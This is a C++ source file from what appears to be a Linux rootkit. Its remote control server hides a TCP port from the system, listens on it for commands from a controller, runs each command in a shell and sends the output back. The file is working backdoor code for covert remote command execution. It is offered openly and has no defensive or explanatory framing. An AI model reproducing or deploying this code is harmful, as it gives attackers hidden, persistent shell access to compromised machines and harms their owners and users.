//
// Created by idan on 12/30/23.
//

#include <thread>
#include <iostream>
#include <unistd.h>
#include <cstring>

#include "remote_control_server.h"

#include "../network_access/linux_server.h"

#include "../../basic/network/basic_network_access.h"
#include "../hider/hider.h"
#include "../../basic/shell/basic_cli_shell_access.h"

#include "msg_to_rootkit.h"
#include "msg_to_controller.h"


void remote_control_server::run() {

    hide_tcp4_port(my_port);
    open_tcp_port(my_port);

    // create a tcp port listener
    linux_server my_listener;

    // assign the connection establisher for the listener
    my_listener.setConnectionEstablisher(generate_tcp_port_connection_establisher(my_port));

    std::thread listen_thread(&linux_server::listen, &my_listener);
    while (true) {
        while (!my_listener.is_client_connected()) {
            sleep(1);
        }

        // get command
        struct msg_to_rootkit msg;
        memset(&msg, '\x00', sizeof(struct msg_to_rootkit));
//        if (my_listener.recv_next_data(reinterpret_cast<char *>(&msg), sizeof(struct msg_to_rootkit)) !=
//            sizeof(struct msg_to_rootkit)) {
//            std::cout << "message wasn't fully received" << std::endl;
//            continue;
//        }
//        my_listener.recv_next_data(reinterpret_cast<char *>(&msg), sizeof(struct msg_to_rootkit));
        my_listener.get_connected_client()->recv_data(reinterpret_cast<char *>(&msg),
                                                      sizeof(struct msg_to_rootkit));
        std::cout << "received message" << std::endl;

        R_OPER id = msg.id;
        char *data = msg.data;

        switch (id) { // currently supports only commands to run in cli shell, todo change
            case R_OPER_EXEC_SHELL_COMMAND: {
                std::cout << "client shell command: " << data << std::endl;

                // execute
                std::string output = execute_cli_shell_command(data);
                std::cout << "command output" << std::endl;
                std::cout << output << std::endl;

                // send the command's output back to linux_client
                struct msg_to_controller msg_back;
                memset(&msg_back, '\x00', sizeof(struct msg_to_controller));
                memcpy(msg_back.data, output.c_str(), std::min(output.size(), (size_t) MAX_MSG_TO_CONTROLLER_SZ));

                my_listener.get_connected_client()->send_data(reinterpret_cast<const char *>(&msg_back),
                                                              sizeof(struct msg_to_controller));

                std::cout << "sent output back" << std::endl;
                break;
            }
            default: {
                std::cout << "bad remote operation id" << std::endl;
                break;
            }
        }

    }
}

void remote_control_server::stop() {
    close_tcp_port(my_port);
    unhide_tcp4_port(my_port);
}
